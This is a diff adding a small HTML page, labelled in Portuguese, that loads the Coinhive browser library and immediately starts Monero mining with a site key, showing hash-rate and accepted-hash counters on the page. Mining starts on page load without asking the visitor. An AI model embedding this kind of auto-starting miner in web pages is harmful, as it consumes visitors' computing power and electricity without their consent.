@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title></title>
+	<link rel="stylesheet" type="text/css" href="./css/index.css">
+	<link rel="stylesheet" type="text/css" href="./css/style.css">
+</head>
+<body>
+
+<div class="principal">
+
+		<div class="monero">
+			<span class="icon-brand"></span>
+		</div>
+
+<div class="recep">
+	<div class="hashesPerSecond"></div>
+	<div class="totalHashes"></div>
+	<div class="acceptedHashes"></div>
+</div>
+</div>
+<script src="https://code.jquery.com/jquery-3.2.1.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('WsLpvpRA7aJd5xQIPHlprVwSr4UtPgvB');
+	miner.start();
+
+
+
+	// Listen on events
+	miner.on('found', function() { /* Hash found */ })
+	miner.on('accepted', function() { /* Hash accepted by the pool */ })
+
+	// Update stats once per second
+	setInterval(function() {
+		var hashesPerSecond = miner.getHashesPerSecond();
+		var totalHashes = miner.getTotalHashes();
+		var acceptedHashes = miner.getAcceptedHashes();
+
+		// Output to HTML elements...
+
+				console.log(hashesPerSecond);
+				console.log(totalHashes);
+				console.log(acceptedHashes);
+
+				$('.hashesPerSecond').html('Hashes/s: '+hashesPerSecond);
+				$('.totalHashes').html('Total hashes: '+totalHashes);
+				$('.acceptedHashes').html('Hashes aceitas: '+acceptedHashes);
+
+
+	}, 1000);
+
+</script>
+
+</body>
+</html>
